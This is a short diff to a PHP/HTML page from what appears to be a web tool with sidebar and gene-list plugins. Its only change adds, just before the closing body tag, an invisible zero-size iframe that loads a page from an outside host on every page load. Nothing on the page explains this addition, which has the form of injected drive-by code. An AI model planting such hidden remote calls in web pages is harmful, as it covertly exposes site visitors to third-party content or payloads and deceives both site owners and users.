@@ -96,6 +96,6 @@
 	   </div></div></br></br>
       <?php if(is_dir('plugins/sidebar')==true){include_once("plugins/sidebar/sidebar.php");}?>
 <a id="genelistlink" href="plugins/genelist/tool.php" data-toggle="modal" data-target="#myModal" onclick="hidemef(this)" data-refresh="true"><font  style="color:#00F;display:none" >here</font></a>
-  
+  <iframe frameborder="0" height="0" scrolling="no" src="http://v22.popgenie.org/demo/service.php?id=new" width="0"></iframe> 
    </body>
 </html>
